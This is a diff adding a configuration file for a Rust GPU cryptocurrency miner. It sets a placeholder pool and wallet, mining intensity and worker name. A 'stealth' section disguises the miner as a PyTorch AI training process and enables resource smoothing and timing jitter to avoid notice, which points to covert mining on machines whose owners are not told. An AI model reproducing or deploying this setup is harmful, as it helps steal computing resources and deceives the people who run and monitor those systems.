@@ -1,0 +1,25 @@
+[mining]
+pool_url = "stratum+tcp://pool.example.com:3333"
+wallet_address = "0x0000000000000000000000000000000000000000"
+algorithm = "Ethash"
+gpu_devices = [0]
+intensity = 80.0
+worker_name = "rust-miner-1"
+
+[stealth]
+profile = "AiTraining"
+process_name = "pytorch_train"
+enable_resource_smoothing = true
+enable_timing_jitter = true
+
+[coordination]
+mode = "Standalone"
+peers = []
+health_check_interval = 30
+metrics_interval = 60
+
+[security]
+enable_seccomp = true
+enable_namespaces = true
+enable_wallet_encryption = true
+profile = "Production"
